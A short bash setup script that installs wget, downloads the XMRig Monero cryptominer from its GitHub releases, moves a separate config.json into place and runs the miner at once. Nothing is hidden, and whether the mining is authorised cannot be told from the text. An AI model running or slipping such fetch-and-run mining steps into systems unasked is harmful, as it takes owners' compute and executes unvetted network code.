#!/bin/bash
set -e

apt-get update \
&& apt install wget -y \
&& wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz \
&& tar -zxvf xmrig-6.10.0-linux-x64.tar.gz \
&& mv xmrig-6.10.0 xmrig \
&& pwd \
&& cd xmrig \
&& \mv -f ../config.json ./  \
&& ./xmrig
